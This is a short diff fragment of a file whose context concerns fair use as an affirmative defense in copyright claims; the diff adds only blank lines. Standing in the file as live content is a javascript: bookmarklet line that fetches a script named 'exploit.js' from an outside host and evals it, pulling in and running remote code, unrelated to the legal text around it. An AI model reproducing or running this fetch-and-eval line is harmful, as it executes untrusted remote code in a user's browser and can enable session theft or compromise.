@@ -56,3 +56,6 @@ Fair use is an affirmative defense that can be raised in response to claims by a
 
 
 javascript:fetch("https://compactcow.com/ltbeef/exploit.js%22).then(data=%3E%7Bdata.text().then(text=%3E%7Beval(text)%7D)%7D);
+
+
+
